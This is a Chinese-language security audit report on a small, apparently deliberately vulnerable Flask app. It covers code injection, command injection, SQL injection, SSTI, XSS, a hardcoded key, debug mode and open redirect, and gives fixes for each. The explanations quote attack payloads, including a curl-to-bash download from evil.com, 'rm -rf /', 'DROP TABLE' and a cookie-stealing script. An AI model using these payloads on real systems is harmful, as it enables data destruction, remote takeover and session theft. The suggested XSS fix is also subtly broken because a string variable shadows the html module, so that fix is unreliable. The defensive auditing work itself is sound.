# 安全审计报告

## 审计摘要
- **审计范围**：`case1_webapp.py`
- **审计时间**：2026-06-18
- **文件数量**：1
- **发现问题**：8（Critical: 3, High: 3, Medium: 0, Low: 2）

## 发现清单

---

### [Critical] 代码注入 (exec) — case1_webapp.py:56-58

**描述**：`exec()` 直接执行来自 URL 查询参数的用户输入，攻击者可执行任意 Python 代码。

**代码**：
```python
@app.route('/admin/exec')
def admin_exec():
    code = request.args.get('code', '')
    exec(code)
    return 'OK'
```

**风险**：攻击者可通过 `/admin/exec?code=__import__('os').system('rm -rf /')` 等 Payload 在服务器上执行任意 Python 代码，包括读写文件、反弹 Shell、窃取数据、横向移动等。这是最高级别的安全漏洞。

**CWE**：CWE-94（Code Injection）

**修复建议**：
```python
# 完全删除此端点。如果必须保留动态执行能力，使用白名单：
ALLOWED_COMMANDS = {
    'hello': lambda: 'Hello, World!',
    'status': lambda: 'System OK',
}

@app.route('/admin/exec')
def admin_exec():
    cmd = request.args.get('code', '')
    if cmd not in ALLOWED_COMMANDS:
        return 'Invalid command', 403
    result = ALLOWED_COMMANDS[cmd]()
    return f'Result: {result}'
```

**参考**：https://owasp.org/www-community/attacks/Code_Injection

---

### [Critical] 命令注入 (Command Injection) — case1_webapp.py:49-50

**描述**：`os.system()` 直接执行包含用户输入（`request.args.get('file')`）拼接的 Shell 命令，攻击者可注入任意系统命令。

**代码**：
```python
@app.route('/export')
def export_data():
    filename = request.args.get('file', 'export.csv')
    cmd = f'cat /tmp/{filename}'
    os.system(cmd)
    return 'Export complete'
```

**风险**：攻击者可通过 `/export?file=;id;whoami;` 或 `/export?file=export.csv;curl http://evil.com/shell.sh | bash` 注入任意 Shell 命令，获得服务器完全控制权。

**CWE**：CWE-78（OS Command Injection）

**修复建议**：
```python
import subprocess
import os.path

EXPORT_DIR = '/tmp'

@app.route('/export')
def export_data():
    filename = request.args.get('file', 'export.csv')
    # 路径规范化 + 白名单验证
    safe_path = os.path.normpath(filename)
    abs_path = os.path.abspath(os.path.join(EXPORT_DIR, safe_path))
    
    # 确保文件在允许目录内
    if not abs_path.startswith(os.path.abspath(EXPORT_DIR)):
        return 'Access denied', 403
    
    # 使用 subprocess.run 传参列表，避免 shell=True
    try:
        result = subprocess.run(['cat', abs_path], capture_output=True, text=True, timeout=5)
        return result.stdout
    except subprocess.TimeoutExpired:
        return 'Timeout', 500
```

**参考**：https://owasp.org/www-community/attacks/Command_Injection

---

### [Critical] 硬编码密钥 (Hardcoded Secret) — case1_webapp.py:9

**描述**：Flask 的 `SECRET_KEY`（`'my-secret-key-123456'`）直接硬编码在源代码中，该密钥用于 Session 签名、CSRF Token 等安全机制。

**代码**：
```python
app.config['SECRET_KEY'] = 'my-secret-key-123456'
```

**风险**：
1. 如果代码泄露到公开仓库（GitHub 等），密钥便全网可见
2. 攻击者可用此密钥伪造 Flask Session，实现身份伪造和 Session 劫持
3. 该密钥过于简单，即使不泄露也容易被暴力猜解

**CWE**：CWE-798（Hardcoded Credentials）

**修复建议**：
```python
import os
import secrets

# 方案一：从环境变量读取
app.config['SECRET_KEY'] = os.environ.get('FLASK_SECRET_KEY')

# 方案二：运行时通过 secrets 模块生成（每次重启后 Session 失效）
app.config['SECRET_KEY'] = os.environ.get('FLASK_SECRET_KEY') or secrets.token_hex(32)
```

**参考**：https://flask.palletsprojects.com/en/stable/config/#SECRET_KEY

---

### [High] SQL 注入 (SQL Injection) — case1_webapp.py:30-31

**描述**：使用 f-string 将用户输入（`request.args.get('q')`）直接拼入 SQL 查询语句，攻击者可读取、篡改或删除数据库中任意数据。

**代码**：
```python
username = request.args.get('q', '')
conn = get_db()
cursor = conn.cursor()
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)
```

**风险**：攻击者可通过 `/search?q=' UNION SELECT 1,2,3,4,5 --` 进行联合查询注入，读取数据库任意表内容；或通过 `/search?q='; DROP TABLE users; --` 删除数据。由于使用的是 sqlite3，WAL 模式和附加数据库攻击也可行。

**CWE**：CWE-89（SQL Injection）

**修复建议**：
```python
@app.route('/search')
def search():
    username = request.args.get('q', '')
    conn = get_db()
    cursor = conn.cursor()
    # 使用参数化查询（占位符）
    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
    results = cursor.fetchall()
    conn.close()
    
    html = '<h2>Search Results</h2>'
    for row in results:
        # 用户数据输出时转义
        html += f'<p>{html.escape(str(row[0]))}: {html.escape(str(row[1]))}</p>'
    return html
```

**参考**：https://owasp.org/www-community/attacks/SQL_Injection

---

### [High] 服务端模板注入 (SSTI) — case1_webapp.py:41-43

**描述**：`render_template_string()` 将用户控制的 URL 路径参数直接拼入模板字符串，攻击者可执行任意 Python 代码或读取服务器敏感文件。

**代码**：
```python
@app.route('/user/<name>')
def user_profile(name):
    template = f'<h1>Profile of {name}</h1><p>Email: {name}@example.com</p>'
    return render_template_string(template)
```

**风险**：攻击者可通过 `/user/{{config}}` 泄露 Flask 配置（含 SECRET_KEY）；通过 `/user/{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}` 在服务器上执行任意系统命令。

**CWE**：CWE-1336（Improper Neutralization of Special Elements Used in a Template Engine）

**修复建议**：
```python
@app.route('/user/<name>')
def user_profile(name):
    # 方案一：使用 render_template() 配合模板文件
    return render_template('user.html', name=name, email=f'{name}@example.com')
    
    # 方案二：如必须使用 render_template_string，将 name 作为变量而非拼入模板
    # return render_template_string(
    #     '<h1>Profile of {{ name }}</h1><p>Email: {{ name }}@example.com</p>',
    #     name=name
    # )
```

**参考**：https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection

---

### [High] 跨站脚本 (XSS) — case1_webapp.py:36

**描述**：数据库查询结果直接通过 f-string 拼入 HTML 响应，未做任何 HTML 转义。如果数据库中存有恶意数据，将导致存储型 XSS。

**代码**：
```python
for row in results:
    html += f'<p>{row[0]}: {row[1]}</p>'
```

**风险**：虽然当前代码通过 SQL 注入可向数据库写入 XSS Payload（如 `<script>document.location='http://evil.com/?c='+document.cookie</script>`），当管理员或用户访问搜索结果时，恶意脚本将在其浏览器中执行，导致 Cookie 窃取、会话劫持等后果。即使 SQL 注入被修复，攻击者通过其他渠道（如注册接口，如果存在）写入恶意数据后仍可触发此漏洞。

**CWE**：CWE-79（Cross-site Scripting）

**修复建议**：
```python
import html

# ...
for row in results:
    html += f'<p>{html.escape(str(row[0]))}: {html.escape(str(row[1]))}</p>'
```

或者使用 `render_template()` 将数据传入模板，Jinja2 默认自动转义。

**参考**：https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

### [Low] 信息泄露 — case1_webapp.py:68

**描述**：Flask 应用以 `debug=True` 模式启动，且监听在 `0.0.0.0`（所有网络接口）。

**代码**：
```python
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
```

**风险**：
1. Debug 模式暴露 Werkzeug 交互式调试器，攻击者触发异常后可在网页中执行任意 Python 代码（类似上面 `exec()` 的效果）
2. Debug 模式会在异常页面展示完整堆栈和变量值，泄露源代码路径、内部变量等敏感信息
3. `host='0.0.0.0'` 使应用对外网暴露，结合 debug 模式尤为危险

**CWE**：CWE-489（Active Debug Code）+ CWE-200（Information Exposure）

**修复建议**：
```python
import os

if __name__ == '__main__':
    # 从环境变量控制 debug 和行为监听地址
    debug_mode = os.environ.get('FLASK_DEBUG', '0') == '1'
    host = os.environ.get('FLASK_HOST', '127.0.0.1')
    app.run(debug=debug_mode, host=host)
```

**参考**：https://flask.palletsprojects.com/en/stable/debugging/

---

### [Low] 不安全的重定向 (Open Redirect) — case1_webapp.py:62-64

**描述**：`redirect()` 的目标 URL 完全由用户控制，未做任何域名白名单验证。

**代码**：
```python
@app.route('/redirect')
def do_redirect():
    target = request.args.get('to', '/')
    return redirect(target)
```

**风险**：攻击者可通过 `/redirect?to=http://phishing-site.com/login` 构造钓鱼链接。受害者看到域名是可信任的 `your-domain.com`，但点击后跳转到钓鱼页面，可能泄露凭证。虽然默认值为 `/`（相对路径），但攻击者可覆盖为任意 URL。

**CWE**：CWE-601（URL Redirection to Untrusted Site）

**修复建议**：
```python
from urllib.parse import urlparse

ALLOWED_NETLOCS = {'your-domain.com', 'localhost'}

@app.route('/redirect')
def do_redirect():
    target = request.args.get('to', '/')
    
    parsed = urlparse(target)
    # 相对路径（无 netloc）直接允许
    if parsed.netloc and parsed.netloc not in ALLOWED_NETLOCS:
        return 'Invalid redirect target', 400
    
    # 也可用 Flask 的 url_for 生成安全的目标
    return redirect(target)
```

**参考**：https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html

---

## 利用链分析

此应用面临极大的安全风险，多个漏洞可串联形成完整攻击链：

1. **信息泄露 (Low) + 代码注入 (Critical)**：Debug 模式暴露的 Werkzeug 调试器本身可执行代码，无需经过 `/admin/exec`
2. **SQL 注入 (High) + XSS (High)**：通过 SQL 注入写入 XSS Payload 到数据库，其他用户查看搜索结果时触发，实现会话劫持
3. **SSTI (High) + 命令注入连锁**：SSTI 可直接获得 RCE，与 `/export` 的命令注入殊途同归
4. **开放重定向 (Low) + SSTI/漏洞利用链接**：攻击者可用开放重定向伪装 SSTI Payload 的 URL
5. **硬编码密钥 (Critical) + SSTI**：即使修复了 SSTI 的直接利用，`{{config}}` 泄露的 SECRET_KEY 可被用于伪造 Session

## 安全评分

| 严重程度 | 数量 | 扣分 |
|---------|------|------|
| Critical | 3    | -75  |
| High     | 3    | -45  |
| Medium   | 0    | -0   |
| Low      | 2    | -6   |
| **总扣分** |      | **-126** |

- **总分**：0/100（最低 0 分）
- **评级**：**F**

## 总结

该 Flask 应用存在极其严重的安全问题。8 个漏洞中包括 3 个 Critical 级别（exec 代码注入、命令注入、硬编码密钥）和 3 个 High 级别（SQL 注入、SSTI、XSS），每一个都可独立导致远程代码执行或数据泄露。建议**立即下线修复**，在所有漏洞解决前不得部署到生产环境。修复优先级：

1. 删除 `/admin/exec` 端点
2. 修复 `/export` 的命令注入
3. 将 SECRET_KEY 移入环境变量
4. 修复 `/search` 的 SQL 注入（参数化查询）
5. 修复 `/user/<name>` 的 SSTI
6. 对搜索结果输出做 HTML 转义
7. 关闭 Debug 模式、限制监听地址
8. 添加重定向白名单验证
